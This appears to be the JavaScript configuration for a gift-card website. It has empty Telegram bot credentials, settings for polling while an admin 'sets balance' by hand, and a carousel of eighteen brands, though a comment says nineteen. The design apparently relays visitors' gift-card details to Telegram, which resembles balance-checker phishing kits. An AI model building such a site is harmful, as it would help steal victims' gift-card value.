// ============================================================
//  CONFIGURATION — set your Telegram credentials here
//  (or load from server-side .env via a backend proxy)
// ============================================================

const CONFIG = {
  // Telegram now sent via /api/telegram (server-side env vars on Vercel)
  TELEGRAM_BOT_TOKEN: '',
  TELEGRAM_CHAT_ID: '',

  // How long (ms) to wait for admin to set balance via admin panel
  // before showing "timeout" message to user
  POLL_TIMEOUT_MS: 5 * 60 * 1000,   // 5 minutes

  // How often to poll for the balance answer (ms)
  POLL_INTERVAL_MS: 3000,
};

// ── Top carousel (19 cards) — paths match files in public/images/ ─────────────
const CAROUSEL_CARDS = [
  { slug: 'itunes',      label: 'iTunes',       img: 'public/images/itunes.png' },
  { slug: 'razer',       label: 'Razer Gold',   img: 'public/images/razer_recent.png' },
  { slug: 'stc',         label: 'STC',          img: 'public/images/stc.png' },
  { slug: 'mobily',      label: 'Mobily',       img: 'public/images/mobily.png' },
  { slug: 'lebara',      label: 'Lebara',       img: 'public/images/lebara_brand.png' },
  { slug: 'du',          label: 'du',           img: 'public/images/du.png' },
  { slug: 'freefire',    label: 'Free Fire',    img: 'public/images/freefire.png' },
  { slug: 'friendi',     label: 'Friendi',      img: 'public/images/friendi.png' },
  { slug: 'gamestop',    label: 'GameStop',     img: 'public/images/game_stop.png' },
  { slug: 'googleplay',  label: 'Google Play',  img: 'public/images/google_play_brand_v2.png' },
  { slug: 'netflix',     label: 'Netflix',      img: 'public/images/netflix_brand.png' },
  { slug: 'nintendo',    label: 'Nintendo',     img: 'public/images/nintendo.png' },
  { slug: 'omantel',     label: 'Omantel',      img: 'public/images/omantel brand.png' },
  { slug: 'playstation', label: 'PlayStation',  img: 'public/images/playstation.png' },
  { slug: 'riot',        label: 'Riot Games',   img: 'public/images/riot_games.png' },
  { slug: 'roblox',      label: 'Roblox',       img: 'public/images/roblox.png' },
  { slug: 'steam',       label: 'Steam',        img: 'public/images/steam.png' },
  { slug: 'xbox',        label: 'Xbox',         img: 'public/images/xbox.png' },
];
